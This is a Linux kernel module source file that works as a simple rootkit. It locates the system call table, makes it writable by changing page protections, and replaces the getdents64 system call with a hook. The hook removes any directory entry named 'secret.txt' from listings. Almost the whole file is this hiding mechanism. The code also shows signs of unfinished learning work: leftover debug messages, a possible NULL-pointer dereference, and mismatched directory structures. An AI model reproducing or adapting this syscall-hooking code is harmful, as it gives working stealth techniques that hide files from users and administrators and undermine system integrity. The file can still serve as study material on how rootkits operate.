#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/sched/signal.h>
#include <linux/proc_ns.h>
#include <linux/fs_struct.h>
#include <asm/current.h>
#include <asm/ptrace.h>
#include <linux/sched.h>
#include <linux/security.h>
#include <linux/types.h>
#define HIDE_ME "secret.txt"

typedef asmlinkage unsigned long (*sys_call)(const struct pt_regs *);
unsigned long *sys_call_table;
asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);

asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs);
int set_page_write(unsigned long addr);
void set_page_no_write(unsigned long addr);
int replace_getdents_syscall(void);
void remove_hook(void);
//int getdents_hook_init(void);
void unload(void);
asmlinkage long unsigned (*org_getdents64) (const struct pt_regs* pt_regs);

asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
{
    int  ret = org_getdents64(pt_regs);
    int err;
    struct linux_dirent64  *dir ,*kdirent, *prev = NULL;
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

    unsigned long i =0;
    
    //using the real syscall for getting the info
    if (ret <=0)
        return ret;
    kdirent = kvzalloc(ret, GFP_KERNEL); //alloc memory to kdirent
    if (kdirent == NULL)
        return ret;
    err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);//copy from user space: >ret< from >dirent< to >kdirent<
    printk(KERN_ALERT "copy form user %u", err);
    printk(KERN_ALERT "copy form user 1: %u", err-ret);

    if (err)
        {
            kvfree(kdirent);
            return ret;
        }
    
   /* if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;*/

    while (i < ret)
    {
        /*
        //######
        inside the loop we running through the
         struct that was return from the real getdents, then we take everyfile name using the 
         linux_dirent64 cur whish is assigend by dirp that is the linux_dirent64 struct of the 
         file we recive from getdents, we take his struct member d_name (which contain the file name) 
         and then we compre it to the file name that we want to hide. if thier equal we get rid with that 
         (explain later how) and then contiune*/
        dir = (void*) kdirent +i;
        // in strcmp return 0 means strings are equal
        printk(KERN_ALERT "runnig");
        if (((memcmp(HIDE_ME,(char *) dir->d_name, strlen(HIDE_ME))) == 0)) /*||(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))*/
        { 
            printk(KERN_ALERT "found file"); 
            if (dir == kdirent){
                ret -= dir->d_reclen;
                memmove(dir, (void*)dir + dir->d_reclen, ret);// putting in dir the next dir in the buff
                printk(KERN_ALERT "found it!");
                continue;
            } 
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;
        i+=dir->d_reclen;//incrise the offset for the while expersion
    }
    err = copy_to_user(dirent, kdirent, (unsigned long) ret);
    if (err)//using out for regular out and not for error out
    {
        kvfree(kdirent);
        return ret;
    }
    return ret;

}

int set_page_write(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        printk(KERN_ALERT "modify the page frame to wirte");
        return 1;
    }
    return 0;
}
void set_page_no_write(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    printk(KERN_ALERT "modify the page frame to read only");

}
int replace_getdents_syscall(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    if (sys_call_table != 0)
    {
        if (set_page_write((unsigned long) sys_call_table))
        {
            //unsigned long orig_cr0 = read_cr0();
            //write_cr0(orig_cr0 &( ~0x10000));
            printk(KERN_ALERT "edit cr0 to write ");
            org_getdents64 = (long unsigned int (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
            sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
            set_page_no_write((unsigned long)sys_call_table);
            printk(KERN_ALERT "edit cr0 to no write ");

            return 1;
        }
        return 0;

    }
    return 0;

}
void remove_hook(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    if (sys_call_table != 0)
     if (set_page_write((unsigned long) sys_call_table))
        {
            printk(KERN_ALERT "edit cr0 to write ");
            sys_call_table[__NR_getdents64] = (unsigned long int)org_getdents64;
            set_page_no_write((unsigned long) sys_call_table);
                printk(KERN_ALERT "edit cr0 to no write");
            return ;
        }
}
int getdents_hook_init(void)
{
    printk(KERN_ALERT "load the module");
    if (!replace_getdents_syscall())
    {  
        printk(KERN_ALERT "error, couldent replace the getdents64");
        return -1;
    }
    printk(KERN_ALERT "load the module secsessfully!");
    return 1;
}
void unload(void)
{
    remove_hook();
}



